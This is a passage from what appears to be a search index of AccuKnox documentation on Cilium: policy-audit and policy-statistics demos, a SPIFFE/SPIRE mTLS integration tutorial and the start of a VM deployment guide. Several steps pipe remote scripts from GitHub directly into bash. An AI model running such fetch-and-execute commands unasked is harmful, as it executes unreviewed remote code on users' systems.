1/1 Running 1 (17h ago) 35h 10.157.68.207 k8s-worker1 <none> <none> cilium-m89bs 1/1 Running 2 (17h ago) 35h 10.157.68.25 k8s-master <none> <none> From the above output, we can identity that, cilium-m89bs is running in the same node as the deathstar pod.","title":"a. Identity the Cilium Agent Pod"},{"location":"open-source/cilium-policy-audit/#b-run-the-cilium-monitor","text":"Run the cilium-monitor process inside the identity cilium pod. kubectl -n kube-system exec cilium-m89bs -- cilium monitor -t policy-verdict","title":"b. Run the Cilium Monitor"},{"location":"open-source/cilium-policy-audit/#c-access-deathstars-apis","text":"Open another shell and execute the following command. $ kubectl exec tiefighter -- curl -s -XPOST deathstar.default.svc.cluster.local/v1/request-landing Ship landed $ kubectl exec xwing -- curl -s -XPOST deathstar.default.svc.cluster.local/v1/request-landing Ship landed","title":"c. Access Deathstar's APIs"},{"location":"open-source/cilium-policy-audit/#d-cilium-policy-verdict","text":"Even though both the requests are successful, if you see the output of the cilium-monitor , you will see a similar output. Policy verdict log: flow 0x0, PolicyName rule1, local EP ID 262, remote ID 3884, proto 6, ingress, action ALLOW auditMode:false, match all, 10.0.0.53:55238 -> 10.0.1.34:80 tcp SYN Policy verdict log: flow 0x0, PolicyName rule2, local EP ID 262, remote ID 30448, proto 6, ingress, action DENY auditMode:true, match all, 10.0.0.54:54928 -> 10.0.1.34:80 tcp SYN The output indicates the following, tiefighter --> deathstar : Policy verdict is ALLOW because of rule1 . This is expected because in rule1 we have configured to allow any pod to access deathstar's HTTP APIs. xwing --> deathstar : Policy verdict is DENY because of ingressDeny clause in rule2 . But the request was allowed because the policy rule2 is set to auditMode: true Users can utilize the above information from cilium-monitor logs and build tools on top of that to observe and visualize the effects of ingressDeny or egressDeny policies before enforcing it.","title":"d. Cilium Policy Verdict"},{"location":"open-source/cilium-policy-stats/","text":"Cilium Policy Statistics \u00b6 A challenge faced by the users of Cilium ecosystem is that Cilium network log ( cilium-monitor ) does not provide any mechanism to collect statistics about the flows that are allowed or denied based on a particular policy. To solve this problem, Accuknox has added improvements to the Cilium network logs. In the patched version, cilium-monitor logs will provide the following information about the flows. PolicyName - Name of the policy with which the flow matches. action - Action taken - Allowed or Denied Users can build tools/scripts which utilize the cilium-monitor logs to collect per-policy statistics. Demo \u00b6 The following steps showcases how to collect logs from Cilium which has the above mentioned information. 1. Setup \u00b6 Refer to our Cilium installation guide and install Cilium in your kubernetes cluster. 2. Deploy Demo Application \u00b6 kubectl create -f https://raw.githubusercontent.com/accuknox/tools/main/other/deathstar-demo/cilium-deathstar-demo-app.yaml The demo application has the following topology. 3. Apply Network Policy \u00b6 Let's apply a policy which enables tiefighter pod to access deathstar 's HTTP APIs. apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : \"rule1\" spec : description : \"L3-L4 policy to restrict deathstar access to empire ships only\" endpointSelector : matchLabels : org : empire class : deathstar ingress : - fromEndpoints : - matchLabels : org : empire toPorts : - ports : - port : \"80\" protocol : TCP To apply the above policy, execute the following command. kubectl apply -f https://raw.githubusercontent.com/accuknox/tools/main/other/cilium-policy-audit-stats/cilium-cnp-deathstar-allow-empire.yaml 4. Collect logs \u00b6 a. Identity the Cilium Agent Pod \u00b6 First we have to identity the cilium pod which is running in the same node as the deathstar pod. kubectl get pods -l class=deathstar -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES deathstar 1/1 Running 1 (17h ago) 2d13h 10.0.1.131 k8s-master <none> <none> kubectl -n kube-system get pods -l k8s-app=cilium -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES cilium-lrg5j 1/1 Running 1 (17h ago) 35h 10.157.68.207 k8s-worker1 <none> <none> cilium-m89bs 1/1 Running 2 (17h ago) 35h 10.157.68.25 k8s-master <none> <none> From the above output, we can identity that cilium-m89bs is running in the same node as the deathstar pod. b. Run the Cilium Monitor \u00b6 Run the cilium-monitor process inside the identified cilium pod. kubectl -n kube-system exec -it cilium-m89bs -- cilium monitor -t policy-verdict c. Access Deathstar's APIs \u00b6 Open another shell and execute the following command. kubectl exec -it tiefighter -- curl -m 5 -s -XPOST deathstar.default.svc.cluster.local/v1/request-landing Ship landed kubectl exec -it xwing -- curl -m 5 -s -XPOST deathstar.default.svc.cluster.local/v1/request-landing curl: ( 28 ) Connection timed out after 5001 milliseconds command terminated with exit code 28 d. Cilium Monitor Logs \u00b6 If you see the output of the cilium-monitor , you will see a similar output. Policy verdict log: flow 0x0, PolicyName rule1, local EP ID 262, remote ID 3884, proto 6, ingress, action ALLOW auditMode:false, match all, 10.0.0.53:55238 -> 10.0.1.34:80 tcp SYN Policy verdict log: flow 0x0, PolicyName implicit-default-deny,, local EP ID 262, remote ID 30448, proto 6, ingress, action DENY auditMode:true, match all, 10.0.0.54:54928 -> 10.0.1.34:80 tcp SYN The log indicates the following, tiefighter --> deathstar : Policy verdict is ALLOW because of policy rule1 . xwing --> deathstar : Policy verdict is DENY because of implicit-default-deny . i.e In Cilium, if a allow policy for the specific flow does not exist then the default action is DENY . Users can utilize the above information from cilium-monitor logs and build tools on top of that to collect per-policy statistics.","title":"Cilium Policy Statistics"},{"location":"open-source/cilium-policy-stats/#cilium-policy-statistics","text":"A challenge faced by the users of Cilium ecosystem is that Cilium network log ( cilium-monitor ) does not provide any mechanism to collect statistics about the flows that are allowed or denied based on a particular policy. To solve this problem, Accuknox has added improvements to the Cilium network logs. In the patched version, cilium-monitor logs will provide the following information about the flows. PolicyName - Name of the policy with which the flow matches. action - Action taken - Allowed or Denied Users can build tools/scripts which utilize the cilium-monitor logs to collect per-policy statistics.","title":"Cilium Policy Statistics"},{"location":"open-source/cilium-policy-stats/#demo","text":"The following steps showcases how to collect logs from Cilium which has the above mentioned information.","title":"Demo"},{"location":"open-source/cilium-policy-stats/#1-setup","text":"Refer to our Cilium installation guide and install Cilium in your kubernetes cluster.","title":"1. Setup"},{"location":"open-source/cilium-policy-stats/#2-deploy-demo-application","text":"kubectl create -f https://raw.githubusercontent.com/accuknox/tools/main/other/deathstar-demo/cilium-deathstar-demo-app.yaml The demo application has the following topology.","title":"2. Deploy Demo Application"},{"location":"open-source/cilium-policy-stats/#3-apply-network-policy","text":"Let's apply a policy which enables tiefighter pod to access deathstar 's HTTP APIs. apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : \"rule1\" spec : description : \"L3-L4 policy to restrict deathstar access to empire ships only\" endpointSelector : matchLabels : org : empire class : deathstar ingress : - fromEndpoints : - matchLabels : org : empire toPorts : - ports : - port : \"80\" protocol : TCP To apply the above policy, execute the following command. kubectl apply -f https://raw.githubusercontent.com/accuknox/tools/main/other/cilium-policy-audit-stats/cilium-cnp-deathstar-allow-empire.yaml","title":"3. Apply Network Policy"},{"location":"open-source/cilium-policy-stats/#4-collect-logs","text":"","title":"4. Collect logs"},{"location":"open-source/cilium-policy-stats/#a-identity-the-cilium-agent-pod","text":"First we have to identity the cilium pod which is running in the same node as the deathstar pod. kubectl get pods -l class=deathstar -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES deathstar 1/1 Running 1 (17h ago) 2d13h 10.0.1.131 k8s-master <none> <none> kubectl -n kube-system get pods -l k8s-app=cilium -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES cilium-lrg5j 1/1 Running 1 (17h ago) 35h 10.157.68.207 k8s-worker1 <none> <none> cilium-m89bs 1/1 Running 2 (17h ago) 35h 10.157.68.25 k8s-master <none> <none> From the above output, we can identity that cilium-m89bs is running in the same node as the deathstar pod.","title":"a. Identity the Cilium Agent Pod"},{"location":"open-source/cilium-policy-stats/#b-run-the-cilium-monitor","text":"Run the cilium-monitor process inside the identified cilium pod. kubectl -n kube-system exec -it cilium-m89bs -- cilium monitor -t policy-verdict","title":"b. Run the Cilium Monitor"},{"location":"open-source/cilium-policy-stats/#c-access-deathstars-apis","text":"Open another shell and execute the following command. kubectl exec -it tiefighter -- curl -m 5 -s -XPOST deathstar.default.svc.cluster.local/v1/request-landing Ship landed kubectl exec -it xwing -- curl -m 5 -s -XPOST deathstar.default.svc.cluster.local/v1/request-landing curl: ( 28 ) Connection timed out after 5001 milliseconds command terminated with exit code 28","title":"c. Access Deathstar's APIs"},{"location":"open-source/cilium-policy-stats/#d-cilium-monitor-logs","text":"If you see the output of the cilium-monitor , you will see a similar output. Policy verdict log: flow 0x0, PolicyName rule1, local EP ID 262, remote ID 3884, proto 6, ingress, action ALLOW auditMode:false, match all, 10.0.0.53:55238 -> 10.0.1.34:80 tcp SYN Policy verdict log: flow 0x0, PolicyName implicit-default-deny,, local EP ID 262, remote ID 30448, proto 6, ingress, action DENY auditMode:true, match all, 10.0.0.54:54928 -> 10.0.1.34:80 tcp SYN The log indicates the following, tiefighter --> deathstar : Policy verdict is ALLOW because of policy rule1 . xwing --> deathstar : Policy verdict is DENY because of implicit-default-deny . i.e In Cilium, if a allow policy for the specific flow does not exist then the default action is DENY . Users can utilize the above information from cilium-monitor logs and build tools on top of that to collect per-policy statistics.","title":"d. Cilium Monitor Logs"},{"location":"open-source/cilium-spire-spiffe/","text":"Cilium-SPIFFE/SPIRE: Integration Guide \u00b6 Why CIlium-SPIFFE/SPIRE integration \u00b6 One great way to remove the overhead of secure communication and scaling the security issue will be to use SPIRE, which provides fine-grained, dynamic workload identity management. SPIRE provides the control plane to provision SPIFFE IDs to the workloads. These SPIFFE IDs can then be used for policy authorization. It enables teams to define and test policies for workloads operating on a variety of infrastructure types, including bare metal, public cloud (such as GCP), and container platforms (like Kubernetes). Note: This integration modifies the following components: cilium-agent, cilium-envoy, and spire-agent. The image below represents the summary of the actions performed in each of them. The Scenario Setup \u00b6 1. Create a cluster \u00b6 GKE export NAME = \"test- $RANDOM \" gcloud container clusters create \" ${ NAME } \" --zone us-west2-a --image-type = UBUNTU gcloud container clusters get-credentials \" ${ NAME } \" --zone us-west2-a MiniKube minikube start --network-plugin = cni --memory = 4096 minikube ssh -- sudo mount bpffs -t bpf /sys/fs/bpf Note: It is assumed that the k8s cluster is already present/reachable and the user has the rights to create service accounts and cluster-role-bindings. 2. Deploy manifest (cilium-control-plane + spire-control-plane + dependencies). \u00b6 kubectl apply -f https://raw.githubusercontent.com/accuknox/microservices-demo/main/cilium-spire/cilium-gke.yaml \\ -f https://raw.githubusercontent.com/accuknox/microservices-demo/main/cilium-spire/spire.yaml 3. Check the status of all the pods. \u00b6 kubectl get pods -A | egrep -i 'spire|cilium' kube-system cilium-26c86 1 /1 Running 0 16h kube-system cilium-jdx87 1 /1 Running 0 16h kube-system cilium-node-init-2zrjf 1 /1 Running 0 16h kube-system cilium-node-init-7xdl9 1 /1 Running 0 16h kube-system cilium-node-init-lk4kz 1 /1 Running 0 16h kube-system cilium-operator-7c97784647-nk86q 1 /1 Running 0 16h kube-system cilium-operator-7c97784647-xrhd2 1 /1 Running 0 16h kube-system cilium-spsm8 1 /1 Running 0 16h spire spire-agent-2glk2 1 /1 Running 0 13m spire spire-agent-bs679 1 /1 Running 0 123m spire spire-agent-lv66b 1 /1 Running 0 5h32m spire spire-server-0 1 /1 Running 0 38m Note: The spire-control plane (spire-agent and spire-server) should be running as well as the cilium-control plane. Congratulations! You have a fully functional Kubernetes cluster with Cilium and SPIRE. \ud83c\udf89 Example Scenario: Upgrading non-secure connections to mTLS \u00b6 The goal of the scenario exposed by the image below is to upgrade the connection from HTTP to HTTPS. This tutorial uses the Star Wars scenario from Cilium, and, based on it, upgrades the connection between the pods xwing to deathstar . A Cilium Network Policy (CNP) is going to be applied to upgrade the connection. For this tutorial the following steps will be performed: Deploy the Star Wars scenario; Apply a CNP to upgrade the connection between xwing and deathstar ; Do an HTTP test connection. Note: for simplicity, in this tutorial, the upgrade happens just for HTTP connection originating from xwing . 1. Create spire registration entries: \u00b6 curl -s https://raw.githubusercontent.com/accuknox/cilium-spire-tutorials/main/scenario03/0-create_registration_entries.sh | bash 2. Deploy Star Wars scenario (from Cilium tutorials): \u00b6 kubectl apply -f https://raw.githubusercontent.com/accuknox/cilium-spire-tutorials/main/scenario03/1-http-sw-app.yaml 3. Check if the SPIFFE ID was assigned in xwing and deathstar pods. \u00b6 The pod xwing must have a new label called spiffe://example.org/xwing and the pod deathstar a new label called spiffe://example.org/deathstar . kubectl -n kube-system exec cilium-74m7n -- cilium endpoint list Defaulted container \"cilium-agent\" out of: cilium-agent, mount-cgroup (init), clean-cilium-state (init) ENDPOINT POLICY (ingress) POLICY (egress) IDENTITY LABELS (source:key[=value]) IPv6 IPv4 STATUS ENFORCEMENT ENFORCEMENT 100 Disabled Disabled 4069 k8s:class=deathstar fd02::8e 10.0.0.176 ready k8s:io.cilium.k8s.policy.cluster=default k8s:io.cilium.k8s.policy.serviceaccount=starwars k8s:io.kubernetes.pod.namespace=default k8s:org=empire spiffe://example.org/deathstar 107 Disabled Disabled 1 k8s:minikube.k8s.io/commit=0c397146a6e4f755686a1509562111cba05f46dd ready k8s:minikube.k8s.io/name=minikube k8s:minikube.k8s.io/updated_at=2021_07_27T16_23_35_0700 k8s:minikube.k8s.io/version=v1.21.0 k8s:node-role.kubernetes.io/control-plane k8s:node-role.kubernetes.io/master reserved:host 732 Disabled Disabled 4 reserved:health fd02::85 10.0.0.178 ready 801 Disabled Disabled 62228 k8s:class=xwing fd02::1c 10.0.0.115 ready k8s:io.cilium.k8s.policy.cluster=default k8s:io.cilium.k8s.policy.serviceaccount=starwars k8s:io.kubernetes.pod.namespace=default k8s:org=alliance spiffe://example.org/xwing 871 Disabled Disabled 26062 k8s:io.cilium.k8s.policy.cluster=default 10.0.0.72 ready k8s:io.cilium.k8s.policy.serviceaccount=coredns k8s:io.kubernetes.pod.namespace=kube-system k8s:k8s-app=kube-dns 3362 Disabled Disabled 12147 k8s:app=spire-server 10.0.0.140 ready k8s:io.cilium.k8s.policy.cluster=default k8s:io.cilium.k8s.policy.serviceaccount=spire-server k8s:io.kubernetes.pod.namespace=spire k8s:statefulset.kubernetes.io/pod-name=spire-server-0 Now, we need to enforce a policy to upgrade the connection for the egress traffic from the xwing pod to port 80 and downgrade the connection for the ingress traffic to port 80 in deathstar . apiVersion: \"cilium.io/v2\" kind: CiliumNetworkPolicy metadata: name: \"tls-upgrade-xwing\" spec: endpointSelector: matchLabels: class: xwing egress: - toPorts: - ports: - port: \"80\" protocol: \"TCP\" originatingTLS: spiffe: peerIDs: - spiffe://example.org/deathstar rules: http: - {} --- apiVersion: \"cilium.io/v2\" kind: CiliumNetworkPolicy metadata: name: \"tls-upgrade-deathstar\" spec: endpointSelector: matchLabels: class: deathstar ingress: - toPorts: - ports: - port: \"80\" protocol: \"TCP\" terminatingTLS: spiffe: peerIDs: - spiffe://example.org/xwing rules: http: - {} --- apiVersion: \"cilium.io/v2\" kind: CiliumNetworkPolicy metadata: name: \"enable-xwing-dns\" spec: description: \"Enable DNS traffic for xwing\" endpointSelector: matchLabels: org: alliance class: xwing egress: - toPorts: - ports: - port: \"53\" protocol: UDP Note: The last policy is related to allowing the DNS traffic for swing. It will be used later for HTTP requests. 4. Apply Cilium Network Policies (CNP): \u00b6 kubectl apply -f https://raw.githubusercontent.com/accuknox/cilium-spire-tutorials/main/scenario03/2-mtls-upgrade.yaml 5. Check if the policies were enforced in the xwing and deathstar endpoints. \u00b6 Just to remember, for pod xwing we apply a policy just for egress and for pod deathstar , just for ingress. Just keep it in mind when looking at the column ENFORCEMENT . kubectl exec cilium-74m7n -- cilium endpoint list Defaulted container \"cilium-agent\" out of: cilium-agent, mount-cgroup (init), clean-cilium-state (init) ENDPOINT POLICY (ingress) POLICY (egress) IDENTITY LABELS (source:key[=value]) IPv6 IPv4 STATUS ENFORCEMENT ENFORCEMENT 100 Enabled Disabled 4069 k8s:class=deathstar fd02::8e 10.0.0.176 ready k8s:io.cilium.k8s.policy.cluster=default k8s:io.cilium.k8s.policy.serviceaccount=starwars k8s:io.kubernetes.pod.namespace=default k8s:org=empire spiffe://example.org/deathstar 107 Disabled Disabled 1 k8s:minikube.k8s.io/commit=0c397146a6e4f755686a1509562111cba05f46dd ready k8s:minikube.k8s.io/name=minikube k8s:minikube.k8s.io/updated_at=2021_07_27T16_23_35_0700 k8s:minikube.k8s.io/version=v1.21.0 k8s:node-role.kubernetes.io/control-plane k8s:node-role.kubernetes.io/master reserved:host 732 Disabled Disabled 4 reserved:health fd02::85 10.0.0.178 ready 801 Disabled Enabled 62228 k8s:class=xwing fd02::1c 10.0.0.115 ready k8s:io.cilium.k8s.policy.cluster=default k8s:io.cilium.k8s.policy.serviceaccount=starwars k8s:io.kubernetes.pod.namespace=default k8s:org=alliance spiffe://example.org/xwing 871 Disabled Disabled 26062 k8s:io.cilium.k8s.policy.cluster=default 10.0.0.72 ready k8s:io.cilium.k8s.policy.serviceaccount=coredns k8s:io.kubernetes.pod.namespace=kube-system k8s:k8s-app=kube-dns 3362 Disabled Disabled 12147 k8s:app=spire-server 10.0.0.140 ready k8s:io.cilium.k8s.policy.cluster=default k8s:io.cilium.k8s.policy.serviceaccount=spire-server k8s:io.kubernetes.pod.namespace=spire k8s:statefulset.kubernetes.io/pod-name=spire-server-0 6. Send landing request. \u00b6 The following script is going to perform an HTTP request. This connection is going to be upgraded to HTTPS. curl -s https://raw.githubusercontent.com/accuknox/cilium-spire-tutorials/main/scenario03/4-curl.sh | bash If the execution was succeeded, the command will return Ship landed . Note: one simple way to verify the encryption traffic is the following. Without the policy applied the traffic from this lab doesn't go through cilium_host. After applying the policy, the cilium_host receives the encrypted traffic. 7. Using TCPdump to verify the connection \u00b6 Login in minikube minikube ssh ; Inside minikube, download tcpdump apt-get update & apt-get install tcpdump ; Capture the traffic from the interface cilium_host tcpdump -i cilium_host port 80 . 8. Clean up the pods and CNPs: \u00b6 curl -s https://raw.githubusercontent.com/accuknox/cilium-spire-tutorials/main/scenario03/5-clean-all.sh | bash Further Reading \u00b6 To learn more about Cilium SPIRE/SPIFFE integrations have a look at our Blogs and GitHub .","title":"Cilium SPIFFE/SPIRE Integration"},{"location":"open-source/cilium-spire-spiffe/#cilium-spiffespire-integration-guide","text":"","title":"Cilium-SPIFFE/SPIRE: Integration Guide"},{"location":"open-source/cilium-spire-spiffe/#why-cilium-spiffespire-integration","text":"One great way to remove the overhead of secure communication and scaling the security issue will be to use SPIRE, which provides fine-grained, dynamic workload identity management. SPIRE provides the control plane to provision SPIFFE IDs to the workloads. These SPIFFE IDs can then be used for policy authorization. It enables teams to define and test policies for workloads operating on a variety of infrastructure types, including bare metal, public cloud (such as GCP), and container platforms (like Kubernetes). Note: This integration modifies the following components: cilium-agent, cilium-envoy, and spire-agent. The image below represents the summary of the actions performed in each of them.","title":"Why CIlium-SPIFFE/SPIRE integration"},{"location":"open-source/cilium-spire-spiffe/#the-scenario-setup","text":"","title":"The Scenario Setup"},{"location":"open-source/cilium-spire-spiffe/#1-create-a-cluster","text":"GKE export NAME = \"test- $RANDOM \" gcloud container clusters create \" ${ NAME } \" --zone us-west2-a --image-type = UBUNTU gcloud container clusters get-credentials \" ${ NAME } \" --zone us-west2-a MiniKube minikube start --network-plugin = cni --memory = 4096 minikube ssh -- sudo mount bpffs -t bpf /sys/fs/bpf Note: It is assumed that the k8s cluster is already present/reachable and the user has the rights to create service accounts and cluster-role-bindings.","title":"1. Create a cluster"},{"location":"open-source/cilium-spire-spiffe/#2-deploy-manifest-cilium-control-plane-spire-control-plane-dependencies","text":"kubectl apply -f https://raw.githubusercontent.com/accuknox/microservices-demo/main/cilium-spire/cilium-gke.yaml \\ -f https://raw.githubusercontent.com/accuknox/microservices-demo/main/cilium-spire/spire.yaml","title":"2. Deploy manifest (cilium-control-plane + spire-control-plane + dependencies)."},{"location":"open-source/cilium-spire-spiffe/#3-check-the-status-of-all-the-pods","text":"kubectl get pods -A | egrep -i 'spire|cilium' kube-system cilium-26c86 1 /1 Running 0 16h kube-system cilium-jdx87 1 /1 Running 0 16h kube-system cilium-node-init-2zrjf 1 /1 Running 0 16h kube-system cilium-node-init-7xdl9 1 /1 Running 0 16h kube-system cilium-node-init-lk4kz 1 /1 Running 0 16h kube-system cilium-operator-7c97784647-nk86q 1 /1 Running 0 16h kube-system cilium-operator-7c97784647-xrhd2 1 /1 Running 0 16h kube-system cilium-spsm8 1 /1 Running 0 16h spire spire-agent-2glk2 1 /1 Running 0 13m spire spire-agent-bs679 1 /1 Running 0 123m spire spire-agent-lv66b 1 /1 Running 0 5h32m spire spire-server-0 1 /1 Running 0 38m Note: The spire-control plane (spire-agent and spire-server) should be running as well as the cilium-control plane. Congratulations! You have a fully functional Kubernetes cluster with Cilium and SPIRE. \ud83c\udf89","title":"3. Check the status of all the pods."},{"location":"open-source/cilium-spire-spiffe/#example-scenario-upgrading-non-secure-connections-to-mtls","text":"The goal of the scenario exposed by the image below is to upgrade the connection from HTTP to HTTPS. This tutorial uses the Star Wars scenario from Cilium, and, based on it, upgrades the connection between the pods xwing to deathstar . A Cilium Network Policy (CNP) is going to be applied to upgrade the connection. For this tutorial the following steps will be performed: Deploy the Star Wars scenario; Apply a CNP to upgrade the connection between xwing and deathstar ; Do an HTTP test connection. Note: for simplicity, in this tutorial, the upgrade happens just for HTTP connection originating from xwing .","title":"Example Scenario: Upgrading non-secure connections to mTLS"},{"location":"open-source/cilium-spire-spiffe/#1-create-spire-registration-entries","text":"curl -s https://raw.githubusercontent.com/accuknox/cilium-spire-tutorials/main/scenario03/0-create_registration_entries.sh | bash","title":"1. Create spire registration entries:"},{"location":"open-source/cilium-spire-spiffe/#2-deploy-star-wars-scenario-from-cilium-tutorials","text":"kubectl apply -f https://raw.githubusercontent.com/accuknox/cilium-spire-tutorials/main/scenario03/1-http-sw-app.yaml","title":"2. Deploy Star Wars scenario (from Cilium tutorials):"},{"location":"open-source/cilium-spire-spiffe/#3-check-if-the-spiffe-id-was-assigned-in-xwing-and-deathstar-pods","text":"The pod xwing must have a new label called spiffe://example.org/xwing and the pod deathstar a new label called spiffe://example.org/deathstar . kubectl -n kube-system exec cilium-74m7n -- cilium endpoint list Defaulted container \"cilium-agent\" out of: cilium-agent, mount-cgroup (init), clean-cilium-state (init) ENDPOINT POLICY (ingress) POLICY (egress) IDENTITY LABELS (source:key[=value]) IPv6 IPv4 STATUS ENFORCEMENT ENFORCEMENT 100 Disabled Disabled 4069 k8s:class=deathstar fd02::8e 10.0.0.176 ready k8s:io.cilium.k8s.policy.cluster=default k8s:io.cilium.k8s.policy.serviceaccount=starwars k8s:io.kubernetes.pod.namespace=default k8s:org=empire spiffe://example.org/deathstar 107 Disabled Disabled 1 k8s:minikube.k8s.io/commit=0c397146a6e4f755686a1509562111cba05f46dd ready k8s:minikube.k8s.io/name=minikube k8s:minikube.k8s.io/updated_at=2021_07_27T16_23_35_0700 k8s:minikube.k8s.io/version=v1.21.0 k8s:node-role.kubernetes.io/control-plane k8s:node-role.kubernetes.io/master reserved:host 732 Disabled Disabled 4 reserved:health fd02::85 10.0.0.178 ready 801 Disabled Disabled 62228 k8s:class=xwing fd02::1c 10.0.0.115 ready k8s:io.cilium.k8s.policy.cluster=default k8s:io.cilium.k8s.policy.serviceaccount=starwars k8s:io.kubernetes.pod.namespace=default k8s:org=alliance spiffe://example.org/xwing 871 Disabled Disabled 26062 k8s:io.cilium.k8s.policy.cluster=default 10.0.0.72 ready k8s:io.cilium.k8s.policy.serviceaccount=coredns k8s:io.kubernetes.pod.namespace=kube-system k8s:k8s-app=kube-dns 3362 Disabled Disabled 12147 k8s:app=spire-server 10.0.0.140 ready k8s:io.cilium.k8s.policy.cluster=default k8s:io.cilium.k8s.policy.serviceaccount=spire-server k8s:io.kubernetes.pod.namespace=spire k8s:statefulset.kubernetes.io/pod-name=spire-server-0 Now, we need to enforce a policy to upgrade the connection for the egress traffic from the xwing pod to port 80 and downgrade the connection for the ingress traffic to port 80 in deathstar . apiVersion: \"cilium.io/v2\" kind: CiliumNetworkPolicy metadata: name: \"tls-upgrade-xwing\" spec: endpointSelector: matchLabels: class: xwing egress: - toPorts: - ports: - port: \"80\" protocol: \"TCP\" originatingTLS: spiffe: peerIDs: - spiffe://example.org/deathstar rules: http: - {} --- apiVersion: \"cilium.io/v2\" kind: CiliumNetworkPolicy metadata: name: \"tls-upgrade-deathstar\" spec: endpointSelector: matchLabels: class: deathstar ingress: - toPorts: - ports: - port: \"80\" protocol: \"TCP\" terminatingTLS: spiffe: peerIDs: - spiffe://example.org/xwing rules: http: - {} --- apiVersion: \"cilium.io/v2\" kind: CiliumNetworkPolicy metadata: name: \"enable-xwing-dns\" spec: description: \"Enable DNS traffic for xwing\" endpointSelector: matchLabels: org: alliance class: xwing egress: - toPorts: - ports: - port: \"53\" protocol: UDP Note: The last policy is related to allowing the DNS traffic for swing. It will be used later for HTTP requests.","title":"3. Check if the SPIFFE ID was assigned in xwing and deathstar pods."},{"location":"open-source/cilium-spire-spiffe/#4-apply-cilium-network-policies-cnp","text":"kubectl apply -f https://raw.githubusercontent.com/accuknox/cilium-spire-tutorials/main/scenario03/2-mtls-upgrade.yaml","title":"4. Apply Cilium Network Policies (CNP):"},{"location":"open-source/cilium-spire-spiffe/#5-check-if-the-policies-were-enforced-in-the-xwing-and-deathstar-endpoints","text":"Just to remember, for pod xwing we apply a policy just for egress and for pod deathstar , just for ingress. Just keep it in mind when looking at the column ENFORCEMENT . kubectl exec cilium-74m7n -- cilium endpoint list Defaulted container \"cilium-agent\" out of: cilium-agent, mount-cgroup (init), clean-cilium-state (init) ENDPOINT POLICY (ingress) POLICY (egress) IDENTITY LABELS (source:key[=value]) IPv6 IPv4 STATUS ENFORCEMENT ENFORCEMENT 100 Enabled Disabled 4069 k8s:class=deathstar fd02::8e 10.0.0.176 ready k8s:io.cilium.k8s.policy.cluster=default k8s:io.cilium.k8s.policy.serviceaccount=starwars k8s:io.kubernetes.pod.namespace=default k8s:org=empire spiffe://example.org/deathstar 107 Disabled Disabled 1 k8s:minikube.k8s.io/commit=0c397146a6e4f755686a1509562111cba05f46dd ready k8s:minikube.k8s.io/name=minikube k8s:minikube.k8s.io/updated_at=2021_07_27T16_23_35_0700 k8s:minikube.k8s.io/version=v1.21.0 k8s:node-role.kubernetes.io/control-plane k8s:node-role.kubernetes.io/master reserved:host 732 Disabled Disabled 4 reserved:health fd02::85 10.0.0.178 ready 801 Disabled Enabled 62228 k8s:class=xwing fd02::1c 10.0.0.115 ready k8s:io.cilium.k8s.policy.cluster=default k8s:io.cilium.k8s.policy.serviceaccount=starwars k8s:io.kubernetes.pod.namespace=default k8s:org=alliance spiffe://example.org/xwing 871 Disabled Disabled 26062 k8s:io.cilium.k8s.policy.cluster=default 10.0.0.72 ready k8s:io.cilium.k8s.policy.serviceaccount=coredns k8s:io.kubernetes.pod.namespace=kube-system k8s:k8s-app=kube-dns 3362 Disabled Disabled 12147 k8s:app=spire-server 10.0.0.140 ready k8s:io.cilium.k8s.policy.cluster=default k8s:io.cilium.k8s.policy.serviceaccount=spire-server k8s:io.kubernetes.pod.namespace=spire k8s:statefulset.kubernetes.io/pod-name=spire-server-0","title":"5. Check if the policies were enforced in the xwing and deathstar endpoints."},{"location":"open-source/cilium-spire-spiffe/#6-send-landing-request","text":"The following script is going to perform an HTTP request. This connection is going to be upgraded to HTTPS. curl -s https://raw.githubusercontent.com/accuknox/cilium-spire-tutorials/main/scenario03/4-curl.sh | bash If the execution was succeeded, the command will return Ship landed . Note: one simple way to verify the encryption traffic is the following. Without the policy applied the traffic from this lab doesn't go through cilium_host. After applying the policy, the cilium_host receives the encrypted traffic.","title":"6. Send landing request."},{"location":"open-source/cilium-spire-spiffe/#7-using-tcpdump-to-verify-the-connection","text":"Login in minikube minikube ssh ; Inside minikube, download tcpdump apt-get update & apt-get install tcpdump ; Capture the traffic from the interface cilium_host tcpdump -i cilium_host port 80 .","title":"7. Using TCPdump to verify the connection"},{"location":"open-source/cilium-spire-spiffe/#8-clean-up-the-pods-and-cnps","text":"curl -s https://raw.githubusercontent.com/accuknox/cilium-spire-tutorials/main/scenario03/5-clean-all.sh | bash","title":"8. Clean up the pods and CNPs:"},{"location":"open-source/cilium-spire-spiffe/#further-reading","text":"To learn more about Cilium SPIRE/SPIFFE integrations have a look at our Blogs and GitHub .","title":"Further Reading"},{"location":"open-source/cilium-vm-k8s/","text":"Deploying Cilium in VMs \u00b6 Cilium is a network policy enforcement engine that can be used both in k8s and VMs. Using Cilium with Kubernetes, one can protect both k8s workloads (pods, services) and virtual machines from network vulnerabilities. Deployment Steps for Cilium VM \u00b6 Dependencies \u00b6 1) A k8s cluster - A k8s cluster (it can be a single node cluster) to act as a control plane and distribute information about identities, labels and IPs of the VMs. Users can manage network polices of the VMs using kubectl just like how pods or services are managed in k8s usually. 2) Docker >= 20.10 should be installed in all the VMs. 1. Download and Install Cilium CLI \u00b6 curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/download/v0.10.2/cilium-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz { ,.sha256sum } 2. Setup Cilium in K8s Cluster \u00b6 cilium install --config tunnel = vxlan --agent-image docker.io/accuknox/cilium:latest --operator-image docker.io/accuknox/cilium-operator-generic:latest Note: If you are using AWS or Azure managed kubernetes cluster, then change the value of --operator-image option in the above command to docker.io/accuknox/cilium-operator-aws:latest or docker.io/accuknox/cilium-operator-azure:latest respectively. 3. Check the Cilium status \u00b6 cilium status There should not be any errors. 4. Enable Cilium clustermesh \u00b6 a) If you are using self-managed k8s, use the following command to enable clustermesh . cilium clustermesh enable --apiserver-image=docker.io/accuknox/cilium-clustermesh-apiserver:latest 